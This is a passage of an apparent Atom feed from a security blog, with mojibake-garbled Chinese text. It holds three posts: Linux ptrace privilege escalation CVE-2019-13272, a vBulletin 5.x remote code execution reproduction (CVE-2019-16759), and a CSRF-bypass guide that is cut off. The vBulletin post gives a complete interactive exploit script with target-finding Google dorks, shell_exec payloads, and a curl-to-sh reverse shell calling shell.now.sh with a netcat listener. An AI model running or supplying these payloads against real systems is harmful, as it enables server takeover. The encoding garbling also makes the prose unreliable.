    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#æ¼æ´æ¦‚è¿°">æ¼æ´æ¦‚è¿°ï¼š</a></li><li><a href="#å½±å“èŒƒå›´">å½±å“èŒƒå›´</a></li><li><a href="#å¤ç°ç¯å¢ƒ">å¤ç°ç¯å¢ƒ</a></li><li><a href="#æ¼æ´å¤ç°">æ¼æ´å¤ç°</a></li></ul><!-- tocstop --><h2><span id="æ¼æ´æ¦‚è¿°">æ¼æ´æ¦‚è¿°ï¼š</span></h2><ul><li><p>å½“è°ƒç”¨PTRACE_TRACEMEæ—¶ï¼Œptrace_linkå‡½æ•°å°†è·å¾—å¯¹çˆ¶è¿›ç¨‹å‡­æ®çš„RCUå¼•ç”¨ï¼Œç„¶åå°†è¯¥æŒ‡é’ˆæŒ‡å‘get_credå‡½æ•°ã€‚ä½†æ˜¯ï¼Œå¯¹è±¡struct credçš„ç”Ÿå­˜å‘¨æœŸè§„åˆ™ä¸å…è®¸æ— æ¡ä»¶åœ°å°†RCUå¼•ç”¨è½¬æ¢ä¸ºç¨³å®šå¼•ç”¨ã€‚</p></li><li><p>PTRACE_TRACEMEè·å–çˆ¶è¿›ç¨‹çš„å‡­è¯ï¼Œä½¿å…¶èƒ½å¤Ÿåƒçˆ¶è¿›ç¨‹ä¸€æ ·æ‰§è¡Œçˆ¶è¿›ç¨‹èƒ½å¤Ÿæ‰§è¡Œçš„å„ç§æ“ä½œã€‚å¦‚æœæ¶æ„ä½æƒé™å­è¿›ç¨‹ä½¿ç”¨PTRACE_TRACEMEå¹¶ä¸”è¯¥å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å…·æœ‰é«˜æƒé™ï¼Œè¯¥å­è¿›ç¨‹å¯è·å–å…¶çˆ¶è¿›ç¨‹çš„æ§åˆ¶æƒå¹¶ä¸”ä½¿ç”¨å…¶çˆ¶è¿›ç¨‹çš„æƒé™è°ƒç”¨execveå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„é«˜æƒé™è¿›ç¨‹ã€‚æ”»å‡»è€…æœ€ç»ˆæ§åˆ¶å…·æœ‰é«˜æƒé™çš„ä¸¤ä¸ªè¿›ç¨‹ptraceå…³ç³»ï¼Œå¯ä»¥è¢«ç”¨æ¥ptraceï¼ŒsuidäºŒè¿›åˆ¶æ–‡ä»¶å¹¶è·å¾—rootæƒé™ã€‚</p></li></ul><h2><span id="å½±å“èŒƒå›´">å½±å“èŒƒå›´</span></h2><ul><li>ç›®å‰å—å½±å“çš„Linuxå†…æ ¸ç‰ˆæœ¬ï¼š<ul><li>Linux Kernel &lt; 5.1.17</li></ul></li></ul><h2><span id="å¤ç°ç¯å¢ƒ">å¤ç°ç¯å¢ƒ</span></h2><ul><li><p>exploitä¸‹è½½åœ°å€ï¼š</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272</a></li></ul></li><li><p>Ubuntu 4.13.0-38-generic</p></li><li><p>Kaliæœªå¤ç°æˆåŠŸï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œgccï¼Œæç¤ºæƒé™ä¸å¤Ÿ</p></li></ul><h2><span id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</span></h2><ul><li>åˆ©ç”¨æ•ˆæœå¦‚ä¸‹å›¾:<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H12304057103645d3ba5553aa6f065726i.png" style="zoom:50%"></center></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#æ¼æ´æ¦‚è¿°&quot;&gt;æ¼æ´æ¦‚è¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#å½±å“èŒƒå›´&quot;&gt;å½±å“èŒƒå›´&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#å¤ç°ç¯å¢ƒ&quot;&gt;å¤ç°ç¯å¢ƒ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#æ¼æ´å¤ç°
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="Linuxæœ¬åœ°æå–" scheme="http://www.vkxss.top/tags/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin 5.x å‰å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
    <link href="http://www.vkxss.top/2019/09/25/CVE-2019-16759/"/>
    <id>http://www.vkxss.top/2019/09/25/CVE-2019-16759/</id>
    <published>2019-09-25T07:30:08.000Z</published>
    <updated>2019-09-25T16:45:55.068Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-ç®€ä»‹">0X00 ç®€ä»‹</a></li><li><a href="#0x01-cveç¼–å·">0X01 CVEç¼–å·</a></li><li><a href="#0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</a></li><li><a href="#0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</a></li><li><a href="#0x04-æ¼æ´æè¿°">0X04 æ¼æ´æè¿°</a></li><li><a href="#0x05-æ¼æ´poc">0X05 æ¼æ´POC</a></li><li><a href="#0x06-æ¼æ´å¤ç°">0X06 æ¼æ´å¤ç°</a></li><li><a href="#0x07-ä¿®å¤å»ºè®®">0X07 ä¿®å¤å»ºè®®</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-ç®€ä»‹">0X00 ç®€ä»‹</span></h2><ul><li>vBulletin æ˜¯ä¸€ä¸ªå•†ç”¨çš„è®ºå›ç¨‹åºï¼Œåœ¨å…¨çƒæ‹¥æœ‰æ•°ä¸‡ç”¨æˆ·ä¸”å¢é•¿é€Ÿåº¦å¾ˆå¿«ã€‚è¯¥è®ºå›é‡‡ç”¨PHP Webè¯­è¨€åŠMySQLæ•°æ®åº“çš„æ–¹å¼è¿›è¡Œæ¶æ„ã€‚ã€Šè´¢å¯Œã€‹ 500å¼ºå’ŒAlexaæ’åå‰100ä¸‡çš„å…¬å¸ç½‘ç«™å¤§éƒ¨åˆ†éƒ½åœ¨ä½¿ç”¨çš„ä¸€æ¬¾äº’è”ç½‘è®ºå›ç¨‹åºã€‚</li></ul><h2><span id="0x01-cveç¼–å·">0X01 CVEç¼–å·</span></h2><ul><li>CVE-2019-16759</li><li>ç›¸å…³ä¿¡æ¯é“¾æ¥ï¼š<a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></li></ul><h2><span id="0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</span></h2><ul><li>é«˜å±</li></ul><h2><span id="0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</span></h2><ul><li>CVE-2019-16759æ¼æ´å½±å“ï¼švBulletin 5.0.0 åˆ°æœ€æ–° 5.5.4ç‰ˆæœ¬</li></ul><h2><span id="0x04-æ¼æ´æè¿°">0X04 æ¼æ´æè¿°</span></h2><ul><li>æ¼æ´é€šè¿‡è¯·æ±‚ajax/render/widget_phpè¿›è¡Œæ¨¡æ¿æ³¨å…¥è§¦å‘ä»£ç æ‰§è¡Œã€‚</li></ul><h2><span id="0x05-æ¼æ´poc">0X05 æ¼æ´POC</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#</span><br><span class="line"># vBulletin 5.x 0day pre-auth RCE exploit</span><br><span class="line"># </span><br><span class="line"># This should work on all versions from 5.0.0 till 5.5.4</span><br><span class="line">#</span><br><span class="line"># Google Dorks:</span><br><span class="line"># - site:*.vbulletin.net</span><br><span class="line"># - &quot;Powered by vBulletin Version 5.5.4&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])</span><br><span class="line"></span><br><span class="line">params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">     try:</span><br><span class="line">          cmd = raw_input(&quot;vBulletin$ &quot;)</span><br><span class="line">          params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot;</span><br><span class="line">          r = requests.post(url = sys.argv[1], data = params)</span><br><span class="line">          if r.status_code == 200:</span><br><span class="line">               print r.text</span><br><span class="line">          else:</span><br><span class="line">               sys.exit(&quot;Exploit failed! :(&quot;)</span><br><span class="line">     except KeyboardInterrupt:</span><br><span class="line">          sys.exit(&quot;\nClosing shell...&quot;)</span><br><span class="line">     except Exception, e:</span><br><span class="line">          sys.exit(str(e))</span><br></pre></td></tr></table></figure><h2><span id="0x06-æ¼æ´å¤ç°">0X06 æ¼æ´å¤ç°</span></h2><ul><li><p>æ¼æ´åœ°å€ï¼š</p><p>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H243ff923b53b4679a8702a6009b941b9f.jpg" style="zoom:30%"></center></font></p></li><li><p>è®¿é—®æ¼æ´URLï¼Œä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸ºPOSTï¼š</p><p>  <font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H21d8a202c5e54ce0ab3bf74ffac27aa5O.jpg" style="zoom:30%"></center></font></p></li><li><p>ç„¶ååœ¨postå‚æ•°ä¸­å¯è¾“å…¥ä»¥ä¸‹ä»»æ„payloadéªŒè¯ï¼š</p><ul><li><p>payload1ï¼šwidgetConfig[code] = echo shell_exec(â€˜idâ€™);<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/He0f05a02b58e463ca5a05d3023d36e21P.jpg" style="zoom:30%"></center></font></p></li><li><p>payload2ï¼šwidgetConfig[code] = echo shell_exec(â€˜whoamiâ€™);<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H5c043157723a4bf58a3f908ad01e0e5ci.jpg" style="zoom:30%"></center></font></p></li><li><p>payload3ï¼šwidgetConfig[code] = echo shell_exec(â€˜uname-aâ€™);<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hd4a1783bda814bcc84064f03d41ffc7fs.jpg" style="zoom:30%"></center></font></p></li><li><p>payload4ï¼šwidgetConfig[code] = echo shell_exec(â€˜curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | shâ€™);</p></li><li><p>æ³¨æ„ä½¿ç”¨payload4åå¼¹shellï¼Œå‚è€ƒå¦‚ä¸‹ï¼š</p><ul><li><p>Reverse Shell as a Service</p><ul><li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li></ul></li><li><p>åœ¨ä½ çš„æœºå™¨ï¼šnc -l 1337<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H6e9006224f994e6dbb970bda9f3fd112J.jpg" style="zoom:30%"></center></font></p></li><li><p>åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼šcurl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H776be97db07f4e419dc90d6cece7f660E.jpg" style="zoom:30%"></center></font></p></li><li><p>åå¼¹Shellä¼šè¯<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Heb0bebfb2fa04d7e88703a212246ea1df.jpg" style="zoom:30%"></center></font></p></li></ul></li></ul></li></ul><h2><span id="0x07-ä¿®å¤å»ºè®®">0X07 ä¿®å¤å»ºè®®</span></h2><ul><li>ä¸Šwafæˆ–é˜²ç«å¢™é…ç½®è§„åˆ™æ‹¦æˆª,ç­‰å¾…å®˜æ–¹ä¿®å¤æ‰“è¡¥ä¸ã€‚</li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.youtube.com/watch?v=ymLRqsbCuVY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ymLRqsbCuVY</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot;&gt;0X00 ç®€ä»‹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cveç¼–å·&quot;&gt;0X01 CVEç¼–å·&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-æ¼æ´å¨èƒç­‰çº§&quot;&gt;0X02 æ¼æ´å¨
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“</title>
    <link href="http://www.vkxss.top/2019/09/19/%E7%BB%95%E8%BF%87CSRF%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/09/19/ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“/</id>
    <published>2019-09-19T07:30:08.000Z</published>
    <updated>2019-11-01T05:24:48.685Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#ä¸€-å…ˆäº†è§£ä¸‹csrf_token">ä¸€ã€ å…ˆäº†è§£ä¸‹CSRF_TOKEN</a><ul><li><a href="#1-ä»€ä¹ˆæ˜¯csrf_token">1. ä»€ä¹ˆæ˜¯CSRF_TOKEN</a></li><li><a href="#2-ä¸ºä»€ä¹ˆcsrf-tokenå¯ä»¥å†™åœ¨cookieé‡Œ">2. ä¸ºä»€ä¹ˆCSRF-Tokenå¯ä»¥å†™åœ¨COOKIEé‡Œ</a></li><li><a href="#3-å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§">3. å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼š</a><ul><li><a href="#31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</a></li><li><a href="#32-cookie-to-header-token">3.2 Cookie-to-header token</a></li></ul></li></ul></li><li><a href="#äºŒ-ç»•è¿‡csrfé˜²å¾¡æ€»ç»“">äºŒã€ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“</a><ul><li><a href="#21-æ‰€æœ‰çš„csrf">2.1 æ‰€æœ‰çš„CSRF</a><ul><li><a href="#211-ç‚¹å‡»åŠ«æŒ">2.1.1 ç‚¹å‡»åŠ«æŒ</a></li><li><a href="#212-æ›´æ”¹è¯·æ±‚æ–¹æ³•">2.1.2 æ›´æ”¹è¯·æ±‚æ–¹æ³•</a></li></ul></li></ul></li><li><a href="#ä¸‰-csrf-tokençš„é˜²å¾¡æªæ–½">ä¸‰ ã€CSRF tokençš„é˜²å¾¡æªæ–½</a><ul><li><a href="#31-åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken">3.1 åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken</a></li><li><a href="#32-ä½¿ç”¨å¦ä¸€ä¸ªsessionçš„csrf-token">3.2 ä½¿ç”¨å¦ä¸€ä¸ªsessionçš„CSRF token</a></li><li><a href="#33-sessionå›ºå®š">3.3 Sessionå›ºå®š</a></li><li><a href="#34-é€šè¿‡xssè·å–csrf_token">3.4 é€šè¿‡XSSè·å–csrf_token</a></li><li><a href="#35-jsonpåŠ«æŒè·å–csrf_token">3.5 JsonpåŠ«æŒè·å–csrf_token</a></li></ul></li><li><a href="#å››-refererå­—æ®µçš„csrfé˜²å¾¡">å››ã€ Refererå­—æ®µçš„CSRFé˜²å¾¡</a><ul><li><a href="#41-refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ">4.1 Refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ</a></li><li><a href="#42-ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼">4.2 ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</a></li></ul></li></ul><!-- tocstop --><h2><span id="ä¸€-å…ˆäº†è§£ä¸‹csrf_token">ä¸€ã€ å…ˆäº†è§£ä¸‹CSRF_TOKEN</span></h2><h3><span id="1-ä»€ä¹ˆæ˜¯csrf_token">1. ä»€ä¹ˆæ˜¯CSRF_TOKEN</span></h3><ul><li>å°±æ˜¯é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰çš„</li></ul><h3><span id="2-ä¸ºä»€ä¹ˆcsrf-tokenå¯ä»¥å†™åœ¨cookieé‡Œ">2. ä¸ºä»€ä¹ˆCSRF-Tokenå¯ä»¥å†™åœ¨COOKIEé‡Œ</span></h3><ul><li><p>å°†csrfä»¤ç‰Œå†™å…¥Cookieï¼Œæ˜¯å› ä¸ºï¼š<br>æœåŠ¡å™¨è¿›è¡Œcsrfé˜²å¾¡æ ¡éªŒçš„æ—¶å€™ï¼Œæ˜¯æ‹¿ç”¨æˆ·httpè¯·æ±‚ä½“ä¸­çš„tokenå‚æ•°å€¼å’Œcookieä¸­çš„csrftokenå€¼è¿›è¡Œæ¯”å¯¹ã€‚<br>å¦‚æœå€¼ä¸€æ ·äº†ï¼Œæ“ä½œæ‰è¢«å…è®¸æ‰§è¡Œã€‚</p></li><li><p>å› ä¸ºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå½“æ­£å¸¸ç”¨æˆ·é€šè¿‡è´¦å·å¯†ç ç­‰æ–¹å¼ç™»é™†ç½‘ç«™Aåï¼Œåœ¨ä¸æ³¨é”€è´¦å·æˆ–å½“å‰COOKIEå¤±æ•ˆä¹‹å‰ï¼Œå†æ¬¡è®¿é—®ç½‘ç«™Aæ—¶ï¼ˆåè®®ã€IPã€ç«¯å£å·ç›¸åŒåˆ™å±äºåŒæºï¼‰æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ¨HTTPè¯·æ±‚åŒ…ä¸­å¸¦ä¸Šè¯¥ç½‘ç«™ç”¨æˆ·ç™»é™†åçš„COOKIEä¿¡æ¯ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåŒæºç­–ç•¥æ— æ³•é˜²å¾¡csrfçš„åŸå› ã€‚</p></li><li><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯¹CSRFçš„ç†è§£åº”ä¸ºï¼šæ”»å‡»è€…å€Ÿç”¨ç”¨æˆ·COOKIEæ‰§è¡Œéç”¨æˆ·æœ¬æ„çš„æ“ä½œã€‚</p></li><li><p>åœ¨æ­¤æ”»å‡»è¿‡ç¨‹ä¸­ç”¨æˆ·COOKIEå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯ä¸å¯è§çš„æ˜¯æœªçŸ¥çš„ã€ä¸å¯è§çš„ï¼Œæ”»å‡»è€…èƒ½åšåˆ°ä»…ä»…æ˜¯å€Ÿç”¨COOKIEï¼Œè€ŒCOOKIEé‡Œé¢å…·ä½“å†™äº†ä»€ä¹ˆï¼Œæ”»å‡»è€…æ˜¯ä¸çŸ¥é“çš„ã€‚åˆå› ä¸ºCOOKIEé‡Œçš„ä¿¡æ¯å¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯ä¸å¯é¢„çŸ¥çš„ï¼Œæ— æ³•ä¼ªé€ çš„ï¼Œæ‰€ä»¥å°†CSRF-TOKENå†™åœ¨COOKIEä¸­ç¬¦åˆå°±CSRFé˜²å¾¡æ€æƒ³ä¸­çš„ä¸å¯é¢„çŸ¥åŸåˆ™ã€‚</p></li></ul><h3><span id="3-å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§">3. å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼š</span></h3><h4><span id="31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</span></h4><ul><li>å¯¹äºæ¯ä¸ªrequestï¼Œåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆä¸€ä¸ªæ–°çš„csrf_tokenï¼Œå¹¶å°†å…¶è¿”å›åœ¨é¡µé¢çš„è¡¨å•ä¸­ã€‚åœ¨æœåŠ¡å™¨ç«¯æ¯æ¬¡æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œéƒ½ä¼šéªŒè¯è¡¨å•ä¸­æ˜¯å¦åŒ…å«æ­£ç¡®çš„csrf_tokenã€‚ç”±äºç¬¬ä¸‰æ–¹ç½‘ç«™æ— æ³•å¾—çŸ¥æ­£ç¡®çš„csrf_tokenï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œcsrfæ”»å‡»ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get_token = get_random_token()</span><br><span class="line"> return &#123;</span><br><span class="line">   &lt;form&gt;</span><br><span class="line">     &lt;input name=field1&gt;&lt;/input&gt;</span><br><span class="line">     &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è¿™ä¸ªæ–¹æ³•çš„å¥½å¤„æ˜¯å®¢æˆ·ç«¯ä¸éœ€è¦æ”¯æŒjavascriptï¼Œå› æ­¤é€šç”¨äºæ‰€æœ‰çš„ç½‘ç«™ã€‚åå¤„æ˜¯ç”±äºæœåŠ¡å™¨ç«¯å¯¹äºæ¯ä¸ªè¯·æ±‚éƒ½ä¼šæ›´æ¢csrf_tokenï¼Œå› æ­¤ä»–éœ€è¦ä¿è¯ç”¨æˆ·æäº¤çš„è¡¨å•æ˜¯ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡è¯·æ±‚çš„è¡¨å•ã€‚å¦‚æœç”¨æˆ·é€šè¿‡å¤šä¸ªtabåŒæ—¶æµè§ˆè¯¥ç½‘ç«™ï¼Œé‚£ä¹ˆå¾€å¾€ä¼šå¯¼è‡´ç”¨æˆ·æäº¤çš„è¡¨å•ä¸æ˜¯æœ€æ–°çš„é‚£ä¸€ä¸ªã€‚</li></ul><h4><span id="32-cookie-to-header-token">3.2 Cookie-to-header token</span></h4><ul><li>ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ä¸ºæ¯ä¸ªsessionç”Ÿæˆä¸€ä¸ªcsrf_tokenï¼Œéšåå°†csrf_tokenä¿å­˜åˆ°cookieä¸­ï¼Œä¹‹åé€šè¿‡javascriptåœ¨æ¯æ¬¡è¯·æ±‚æ—¶å°†csrf_tokenè®¾ç½®åˆ°http headerä¸­çš„X-Csrf-Tokenå±æ€§ä¸­ã€‚å†åœ¨æœåŠ¡å™¨ç«¯æ¯”è¾ƒCookieçš„csrf_tokenä¸headerä¸­çš„tokenæ˜¯å¦ä¸€è‡´ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å½“ç”¨æˆ·ç™»å½•æ—¶è®¾ç½®Cookie</span><br><span class="line">Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</span><br><span class="line"></span><br><span class="line">//å½“ç”¨æˆ·å‘é€è¯·æ±‚æ—¶è®¾ç½®Http Headerä¸­çš„X-Csrf-Token</span><br><span class="line">X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</span><br></pre></td></tr></table></figure><h2><span id="äºŒ-ç»•è¿‡csrfé˜²å¾¡æ€»ç»“">äºŒã€ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“</span></h2><ul><li><p>æ³¨ï¼šåŸæ–‡é“¾æ¥ï¼š<a href="https://medium.com/swlh/bypassing-csrf-protection-c9b217175eeï¼ˆéœ€è¦ç§‘å­¦ä¸Šç½‘ï¼‰" target="_blank" rel="noopener">https://medium.com/swlh/bypassing-csrf-protection-c9b217175eeï¼ˆéœ€è¦ç§‘å­¦ä¸Šç½‘ï¼‰</a></p></li><li><p>CSRFæ¼æ´å¾ˆå®¹æ˜“å°±å¯ä»¥è¢«å‘ç°å¹¶åˆ©ç”¨ã€‚ä¸€çœ¼çœ‹å»å¾ˆå¤šç«™ç‚¹å¥½åƒåœ¨è¿™æ–¹é¢éƒ½åšå¾—ä¸é”™ï¼šå½“ä½ æ£€æŸ¥é’ˆå¯¹æ•æ„Ÿæ“ä½œçš„è¯·æ±‚æ—¶ï¼Œä»–ä»¬å¾€å¾€ä¼šå®æ–½CSRFä¿æŠ¤ã€‚æœ‰æ—¶å€™å¯èƒ½æ˜¯ä¸€ä¸ªåœ¨è¯·æ±‚ä¸»ä½“ä¸­çš„CSRF tokenï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªrefererå­—æ®µæ£€æµ‹ï¼Œæˆ–è€…æœ‰æ—¶æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„HTTPå¤´å­—æ®µæˆ–è€…cookieå­—æ®µã€‚</p></li><li><p>ä½†æ˜¯CSRFçš„é˜²å¾¡ä¸ä»£è¡¨å®ƒå°±ä¸å¯ä»¥è¢«ç»•è¿‡ã€‚ä»Šå¤©æˆ‘ä»¬è®¨è®ºä¸€äº›æˆ‘å¦‚ä½•ç»•è¿‡CSRFé˜²å¾¡æªæ–½çš„æŠ€æœ¯ã€‚</p></li></ul><h3><span id="21-æ‰€æœ‰çš„csrf">2.1 æ‰€æœ‰çš„CSRF</span></h3><ul><li>ä¸ç®¡å“ªç§CSRFé˜²å¾¡æªæ–½éƒ¨ç½²ï¼Œä½ éƒ½å¯ä»¥å…ˆå°è¯•å¦‚ä¸‹ä¸¤ä»¶äº‹ï¼šç‚¹å‡»åŠ«æŒå’Œæ›´æ”¹è¯·æ±‚æ–¹æ³•ã€‚</li></ul><h4><span id="211-ç‚¹å‡»åŠ«æŒ">2.1.1 ç‚¹å‡»åŠ«æŒ</span></h4><ul><li>åœ¨åŒä¸€ä¸ªåŠŸèƒ½ç«¯ç‚¹åˆ©ç”¨ç‚¹å‡»åŠ«æŒä¼šç»•è¿‡æ‰€æœ‰CSRFé˜²å¾¡ã€‚å› ä¸ºä»æŠ€æœ¯ä¸Šè®²ï¼Œè¯·æ±‚ç¡®å®æ¥è‡ªåˆæ³•ç«™ç‚¹ï¼Œå¦‚æœæ˜“å—æ”»å‡»çš„ç«¯ç‚¹æ‰€åœ¨é¡µé¢å®¹æ˜“é­å—ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„CSRFä¿æŠ¤å°†å˜å¾—æ²¡æœ‰æ•ˆæœï¼Œæ”»å‡»è€…å¯ä»¥ä»»æ„æ‰§è¡ŒCSRFæ”»å‡»ã€‚</li></ul><h4><span id="212-æ›´æ”¹è¯·æ±‚æ–¹æ³•">2.1.2 æ›´æ”¹è¯·æ±‚æ–¹æ³•</span></h4><ul><li>å¦å¤–å€¼å¾—ä¸€è¯•çš„æ–¹æ³•å°±æ˜¯æ›´æ”¹è¯·æ±‚çš„æ–¹æ³•ã€‚å¦‚æœè¦ä¼ªé€ çš„æ•æ„Ÿè¯·æ±‚æ˜¯é€šè¿‡POSTæ–¹æ³•å‘é€çš„ï¼Œé‚£ä¹ˆå°è¯•å°†å…¶è½¬æ¢ä¸ºGETè¯·æ±‚ã€‚å¦‚æœæ“ä½œæ—¶é€šè¿‡GETæ–¹æ³•å‘é€çš„ï¼Œé‚£ä¹ˆå°è¯•è½¬æ¢ä¸ºPOSTæ–¹æ³•ã€‚åº”ç”¨ç¨‹åºå¯èƒ½ä»ç„¶æ‰§è¡Œæ“ä½œï¼Œä¸”é€šå¸¸æ²¡æœ‰ä»»ä½•ä¿æŠ¤æœºåˆ¶ã€‚</li></ul><ul><li>ä¾‹å¦‚ï¼Œå¦‚ä¸‹è¯·æ±‚ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 